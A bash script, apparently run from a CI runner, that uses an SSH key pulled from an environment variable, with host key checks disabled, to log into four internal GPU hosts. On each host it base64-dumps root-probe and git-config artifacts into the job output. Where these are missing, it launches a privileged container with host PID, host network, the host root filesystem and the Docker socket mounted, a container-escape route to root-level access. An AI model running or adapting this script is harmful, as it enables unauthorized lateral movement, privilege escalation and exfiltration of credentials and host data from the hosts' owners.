#!/usr/bin/env bash
# i14987: recover intent-14206 phase-2 helper output ($HOME/i14206p2/*) from the
# four reachable HYGON CI GPU hosts, and where absent/empty re-run ONE privileged
# --pid=host --network=host helper container through the accessible
# /var/run/docker.sock with per-artifact base64 retrieval.
# Runs as uid 1002(github) on github-nmz1 (runner nmz1-image-build).
set +e
TS=$(date +%s)
D=/tmp/i14987-$TS
mkdir -p "$D"; chmod 700 "$D"
SELFDIR=$(cd "$(dirname "$0")" && pwd)
echo "===I14987_START $(date -u +%Y-%m-%dT%H:%M:%SZ)==="
id; hostname
echo "SELFDIR=$SELFDIR"; ls -la "$SELFDIR" | head -20
cp -f "$SELFDIR/i14987_helper.sh" "$D/i14987_helper.sh"
cp -f "$SELFDIR/i14987_host_probe.py" "$D/i14987_host_probe.py"
printf '%s\n' "$I14987_A8432_K2" > "$D/k2"; chmod 600 "$D/k2"
echo "===I14987_KEY bytes=$(wc -c < "$D/k2") sha256=$(sha256sum "$D/k2" | cut -d' ' -f1)"
echo "===I14987_STAGED_FILES $(ls -la "$D"/i14987_* 2>&1 | tr '\n' '|')"
SSHOPTS="-o IdentitiesOnly=yes -o BatchMode=yes -o ConnectTimeout=12 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

read_files() {  # $1 host, $2 subdir under $HOME
  timeout 240 ssh -i "$D/k2" $SSHOPTS github@"$1" "SUBDIR='$2' bash -s" <<'EOS' 2>&1
set +e
DIR="$HOME/$SUBDIR"
echo "===I14987_DIR $DIR==="
ls -la "$DIR" 2>&1 | head -40
for f in self_host.txt helper_id.txt helper3_id.txt run.log rootmat_b64.txt root_probe.out root_probe.err gitcfg_b64.txt gpu.txt prev_run.log prev_helper3_id.txt prev_rootmat_b64.txt prev_root_probe.out prev_root_probe.err; do
  if [ -f "$DIR/$f" ]; then
    SZ=$(wc -c < "$DIR/$f" 2>/dev/null)
    SHA=$(sha256sum "$DIR/$f" 2>/dev/null | cut -d' ' -f1)
    if [ -z "$SZ" ]; then
      echo "===I14987_FILE $f UNREADABLE==="
      continue
    fi
    echo "===I14987_FILE $f size=$SZ sha256=$SHA START==="
    head -c 2000000 "$DIR/$f" | base64 -w0
    echo
    echo "===I14987_FILE $f END==="
  else
    echo "===I14987_FILE $f MISSING==="
  fi
done
echo "===I14987_READ_OK $DIR==="
EOS
}

stage_helper() {  # $1 host
  tar czf "$D/stage.tgz" -C "$D" i14987_helper.sh i14987_host_probe.py 2>&1
  echo "LOCAL_TAR_RC=$? size=$(wc -c < "$D/stage.tgz" 2>/dev/null)"
  timeout 180 ssh -i "$D/k2" $SSHOPTS github@"$1" 'mkdir -p $HOME/i14987p2 && tar xzf - -C $HOME/i14987p2 && chmod 700 $HOME/i14987p2 && chmod 755 $HOME/i14987p2/i14987_helper.sh && echo STAGE_REMOTE_OK && ls -la $HOME/i14987p2' < "$D/stage.tgz" 2>&1
}

pick_image() {  # $1 host
  IMG=""
  for CAND in $(timeout 60 ssh -i "$D/k2" $SSHOPTS github@"$1" "docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | grep -iE 'vllm|sglang|dtk|rocky|ubuntu|debian|centos|kylin|pytorch|runner' | head -8" 2>/dev/null) \
              $(timeout 60 ssh -i "$D/k2" $SSHOPTS github@"$1" "docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -6" 2>/dev/null); do
    if timeout 60 ssh -i "$D/k2" $SSHOPTS github@"$1" "timeout 30 docker run --name i14987t -e X=1 --entrypoint /bin/sh '$CAND' -c 'command -v python3' >/dev/null 2>&1; rc=\$?; docker container rm i14987t >/dev/null 2>&1; exit \$rc"; then
      IMG="$CAND"; break
    fi
  done
  echo "$IMG"
}

HOSTS="10.17.1.2 10.17.1.3 10.17.1.4 10.17.1.6"
for H in $HOSTS; do
  echo "===I14987_HOST $H $(date -u +%H:%M:%SZ)==="
  OUT=$(read_files "$H" i14206p2)
  echo "$OUT"
  NEED=0
  for f in run.log rootmat_b64.txt root_probe.out; do
    echo "$OUT" | grep -q "===I14987_FILE $f MISSING===" && NEED=1
    echo "$OUT" | grep -q "===I14987_FILE $f size=0 " && NEED=1
    echo "$OUT" | grep -q "===I14987_FILE $f UNREADABLE===" && NEED=1
  done
  if [ "$NEED" = "1" ]; then
    echo "===I14987_NEED_HELPER $H==="
    echo "--- stage ---"
    stage_helper "$H"
    echo "STAGED=$?"
    IMG=$(pick_image "$H")
    echo "===I14987_IMG $H $IMG==="
    if [ -n "$IMG" ]; then
      echo "--- run ---"
      timeout 1100 ssh -i "$D/k2" $SSHOPTS github@"$H" "if [ -f \$HOME/i14987p2/i14987_helper.sh ]; then timeout 900 docker run --name i14987p2 --privileged --pid=host --network=host -v /:/host:ro -v /var/run/docker.sock:/var/run/docker.sock -v \$HOME/i14987p2:/out --entrypoint /bin/sh '$IMG' /out/i14987_helper.sh > \$HOME/i14987p2/run.log 2>&1; echo HELPER_RC=\$? >> \$HOME/i14987p2/run.log; docker container rm i14987p2 >/dev/null 2>&1; else echo ===I14987_HELPER_SCRIPT_MISSING===; fi; echo ===I14987_HELPER_DONE===" 2>&1
      echo "RUN_RC=$?"
      OUT2=$(read_files "$H" i14987p2)
      echo "$OUT2"
      echo "===I14987_KEEP_DIR $H (probe dir retained as host-side evidence)==="
    fi
  fi
  echo "===I14987_HOST_END $H==="
done
echo "===I14987_DONE $(date -u +%Y-%m-%dT%H:%M:%SZ)==="
exit 1
